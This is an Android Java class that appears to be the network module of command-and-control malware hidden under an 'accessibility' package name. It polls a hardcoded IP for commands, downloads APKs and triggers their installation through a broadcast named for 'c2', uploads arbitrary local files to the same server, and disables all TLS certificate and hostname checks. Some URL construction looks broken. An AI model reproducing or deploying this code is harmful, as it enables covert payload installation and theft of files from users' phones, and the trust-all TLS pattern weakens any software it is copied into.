package test.com.accessibility.util.network;


import android.content.Context;
import android.content.Intent;

import android.util.Log;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class NetworkHelper {
    private static String cmdServerUri = "api/v1.0/cmd";
    private static String ownId = "00000001";

    static class https_server {
        private static String protocol = "https";
        private static String hostIP = "118.190.159.86";
        private static String hostPort = "443";
        private static String upLoadServerUri = "api/v1.0/upload_message";
        private static String ownId = "00000001";

        public static String getUploadURI(){
            return protocol + "://" + hostIP + ":" + hostPort + "/" + upLoadServerUri + "/" + ownId;
        }
    }

    static class http_server {
        private static String protocol = "http";
        private static String hostIP = "118.190.159.86";
        private static String hostPort = "5000";
        private static String upLoadServerUri = "api/v1.0/upload_message";
        private static String ownId = "00000001";

        public static String getUploadURI(){
            return protocol + "://" + hostIP + ":" + hostPort + "/" + upLoadServerUri + "/" + ownId;
        }
    }
    private static final String TAG = "NwHelper";
    private static String intentUri = "com.example.action.ACTION_INSTALL_APK";

    public static int installInPlugin(Context context, String file_path) {
        String ACTION_c2_INSTALL_APK = intentUri;
        String ACTION_INSTALL_APK_EXTRA_PARAM1 = "APK_PATH";
        Intent intent = new Intent(ACTION_c2_INSTALL_APK);
        intent.putExtra(ACTION_INSTALL_APK_EXTRA_PARAM1, file_path);
        Log.d(TAG, "sending broadcasting intent.");
        context.sendBroadcast(intent);
        return 0;
    }

    public static int processPluginCommands(Context context, String[] cmds) {
        for (String cmd: cmds
                ) {
            if (cmd.contains("install")) {
                String[] args = cmd.split(":");
                String path = args[1];
                String sdPath = context.getExternalFilesDir(null).getAbsolutePath() + File.separator
                        + String.format("%s.apk", path);
                Log.d(TAG, String.format("%s: %s", args[0], sdPath));
                int response = DownloadFile(path, sdPath);
                if (response == 0) {
                    installInPlugin(context, sdPath);
                }
            }
        }

        return  0;
    }

    public static int DownloadFile(String arg, String sdCardFilePath) {
        String downloadUri = "api/v1.0/download";
        Log.d(TAG, String.format("DownloadFile"));
        InputStream input = null;
        OutputStream output = null;
        HttpURLConnection connection = null;
        try {
            Log.d(TAG, "url:"+downloadUri + arg);
            URL url = new URL(downloadUri + arg);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("USER-AGENT", String.format("Mozilla/5.0-%s", ownId.substring(0, 2)));
            connection.setRequestProperty("ACCEPT-LANGUAGE", String.format("en US-%s", ownId.substring(2, 8)));
            connection.connect();

            // expect HTTP 200 OK, so we don't mistakenly save error report
            // instead of the file
            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                Log.d(TAG, ":"+connection.getResponseCode());
                return -1;
            }

            Log.d(TAG, "downloading...");

            // download the file
            input = connection.getInputStream();
            output = new FileOutputStream(sdCardFilePath);

            byte data[] = new byte[4096];

            int count;
            while ((count = input.read(data)) != -1) {
                output.write(data, 0, count);
            }
        } catch (Exception e) {
            Log.d(TAG, ":"+e.toString());
            return -1;

        } finally {
            try {
                if (output != null)
                    output.close();
                if (input != null)
                    input.close();
            } catch (IOException ignored) {
            }

            if (connection != null)
                connection.disconnect();
        }
        return 0;
    }

    public static int receiveCommand(Context context) {
        URL url = null;
        HttpsURLConnection connection = null;
        BufferedReader br = null;

        try {

            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }

                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);


            url = new URL(https_server.hostIP + cmdServerUri);
            connection = (HttpsURLConnection)url.openConnection();

            connection.setRequestMethod("GET");
            connection.setRequestProperty("USER-AGENT", String.format("Mozilla/5.0-%s", ownId.substring(0, 2)));
            connection.setRequestProperty("ACCEPT-LANGUAGE", String.format("en US-%s", ownId.substring(2, 8)));
            connection.setReadTimeout(10000 /* milliseconds */ );
            connection.setConnectTimeout(15000 /* milliseconds */ );

            String jsonString = null;

            StringBuilder sb = new StringBuilder();
            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
            }
            br.close();

            jsonString = sb.toString();
            JSONObject obj = new JSONObject(jsonString);
            Log.d(TAG, jsonString);
            String[] cmds = obj.getString("cmd").split(";");
            processPluginCommands(context, cmds);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }

        return 0;
    }

    public int uploadFile(Context context, String sourceFileUri) {
        String fileName = sourceFileUri;
        int serverResponseCode = 0;

        try {
            Log.d(TAG, "[tluo] Uploading file: " + sourceFileUri);
            String uploadUri = https_server.getUploadURI();
            HttpClient client = new DefaultHttpClient();
            HttpPost post = new HttpPost(uploadUri);
            MultipartEntityBuilder builder = getEntityBuilder(sourceFileUri);
            post.setEntity(builder.build());
            HttpResponse response = client.execute(post);
            HttpEntity entity = response.getEntity();
            entity.consumeContent();
            client.getConnectionManager().shutdown();
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "Exception : "  + e.getMessage(), e);
        }

        return serverResponseCode;
    }

    protected static MultipartEntityBuilder getEntityBuilder(String sourceFileUri){
        MultipartEntityBuilder builder = MultipartEntityBuilder.create();
        builder.setMode(HttpMultipartMode.BROWSER_COMPATIBLE);
        final File file = new File(sourceFileUri);
        FileBody fb = new FileBody(file);
        builder.addPart("file", fb);
        builder.addTextBody("file_uri", sourceFileUri);
        return builder;
    }

    ////////////////////////// https //////////////////////////
    public static int uploadFile(Context context, String sourceFileUri, boolean https) throws Exception {
        int serverResponseCode = 0;
        try {
            // Create a trust manager that does not validate certificate chains
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }

                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            String boundary = "===" + System.currentTimeMillis() + "===";
            Log.d(TAG, "URI:" + https_server.getUploadURI());
            URL url = new URL(https_server.getUploadURI());
            HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
            httpsConn.setRequestMethod("POST");
            httpsConn.setUseCaches(false);
            httpsConn.setDoOutput(true);    // indicates POST method
            httpsConn.setDoInput(true);
            httpsConn.setRequestProperty("User-Agent","test-000");
            httpsConn.setRequestProperty("Accept-Language","English:test-01");
            httpsConn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            loadFileUploadSec(httpsConn, boundary, sourceFileUri);

            Reader reader = new InputStreamReader(httpsConn.getInputStream());
            String response = "";
            while (true) {
                int ch = reader.read();
                if (ch == -1) {
                    break;
                }
                response += (char) ch;
            }
            Log.d(TAG, "[tluo] https response:" + response);
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "Exception : " + e.getMessage(), e);
        }
        return serverResponseCode;
    }

    protected static void loadFileUploadSec(HttpsURLConnection httpsConn, String boundaryString, String sourceFileUri){
        try {
            final File uploadedFile = new File(sourceFileUri);
            OutputStream outputStream = httpsConn.getOutputStream();
            BufferedWriter httpRequestBodyWriter = new BufferedWriter(new OutputStreamWriter(outputStream));
            // Include value from the myFileDescription text area in the post data
            httpRequestBodyWriter.write("\n\n--" + boundaryString + "\n");
            httpRequestBodyWriter.write("Content-Disposition: form-data; name=\"file_uri\"");
            httpRequestBodyWriter.write("\n\n");
            httpRequestBodyWriter.write(uploadedFile.getName());

            // Include the section to describe the file
            httpRequestBodyWriter.write("\n--" + boundaryString + "\n");
            httpRequestBodyWriter.write("Content-Disposition: form-data;"
                    + "name=\"" + "file" + "\";"
                    + "filename=\"" + uploadedFile.getName() + "\""
                    + "\nContent-Type: " + URLConnection.guessContentTypeFromName(uploadedFile.getName()) + "\n\n");
            httpRequestBodyWriter.flush();

            FileInputStream inputStreamToLogFile = new FileInputStream(uploadedFile);
            int bytesRead;
            byte[] dataBuffer = new byte[1024];
            while((bytesRead = inputStreamToLogFile.read(dataBuffer)) != -1) {
                outputStream.write(dataBuffer, 0, bytesRead);
            }
            outputStream.flush();

            // Mark the end of the multipart http request
            httpRequestBodyWriter.write("\n--" + boundaryString + "--\n");
            httpRequestBodyWriter.flush();

            // Close the streams
            outputStream.close();
            httpRequestBodyWriter.close();
        } catch (Exception e) {
            Log.d(TAG, "[tluo] Exception When Prepare HTTPs FileUpload Payload:" + e);
        }
    }
}

